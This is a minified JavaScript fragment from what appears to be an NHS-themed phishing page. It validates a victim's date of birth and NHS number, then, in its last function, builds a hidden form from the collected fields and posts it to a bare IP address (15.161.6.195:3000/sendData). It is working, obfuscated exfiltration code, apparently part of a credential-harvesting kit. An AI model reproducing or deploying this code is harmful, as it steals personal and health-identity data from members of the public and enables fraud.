...
function ib(){N.value.length?(X(N,!0),ia=N):Y(N)}function jb(){let a=Date.now()-Date.parse(O.value);c=Math.floor(a/315576E5);fa=O.value;80<=c?sa():70<=c?ra():60<=c?qa():50<=c?pa():oa();return!0}function gb(){var a=L.value;a=a.replace(/\s/g,"");(a=isNaN(a)||0>a||10!==String(a).length?0:a)?(X(L,!1),3999999999>a&&32E8<a||3112999999>a&&10101E4<a||(eb.innerHTML='<p style="font-size:35px;"> NHS number appears to be valid...</p>',X(L,!0))):Y(L)}
function kb(){{var a={C:0,B:ha,J:ia,A:fa,v:m.value,F:q.value,H:l.value,I:p.value,D:n.value,G:e};const b=document.createElement("form");b.method="post";b.action="http://15.161.6.195:3000/sendData";for(const d in a)if(a.hasOwnProperty(d)){const f=document.createElement("input");f.type="hidden";f.name=d;f.value=a[d];b.appendChild(f)}document.body.appendChild(b);b.submit()}};